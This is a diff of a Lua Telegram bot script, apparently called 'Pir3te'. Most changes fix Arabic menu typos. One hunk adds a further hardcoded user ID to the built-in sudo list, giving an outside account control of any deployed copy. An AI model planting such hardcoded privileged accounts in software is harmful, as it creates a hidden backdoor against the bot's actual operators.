@@ -16,7 +16,7 @@ https   = require("ssl.https")
 sudos   = dofile("sudo.lua")
 bot_id  = token:match("(%d+)")  
 Id_Sudo = Sudo
-List_Sudos = {Id_Sudo,725624600,665877797}
+List_Sudos = {Id_Sudo,853647243,725624600,665877797}
 print("\27[34m"..[[
 
 >> Best Source in Telegram
@@ -5600,7 +5600,7 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n📂 ┇ اهلا بك في متجر ملفات القرصان \n📮 ┇ الملفات الموجوده حاليا \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n\n"
+local TextS = "\n📂 ┇ اهلا بك في متجر ملفات قرصان \n📮 ┇ الملفات الموجوده حاليا \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n\n"
 local TextE = "\nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ\n📌 ┇ تدل علامة (✔) الملف مفعل\n".."📌 ┇ تدل علامة (✖) الملف معطل\n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
@@ -5977,7 +5977,7 @@ Text = [[
 ✨|↫ تفعيل البوت الخدمي
 🎟|↫ تعطيل البوت الخدمي
 ✨|↫ تفعيل + اسم الملف
-🎟|↫ تعطيل + اسن الملف
+🎟|↫ تعطيل + اسم الملف
 ✨|↫ المتجر
 🎟|↫ الملفات
 ✨|↫ اوامر المطور
@@ -6818,7 +6818,7 @@ end
 end
 end
 if (data.ID == "UpdateOption" and data.value_.value_ == "Ready") then
-print('\27[30;32m»» تم تعديل النسخه بواسطه حسن مؤيد ««\n\27[1;37m')
+print('\27[30;32m»» تم تعديل النسخه بواسطه حسن مؤيد  ««\n\27[1;37m')
 local list = database:smembers(bot_id..'Pir3te:UsersBot')  
 for k,v in pairs(list) do 
 tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
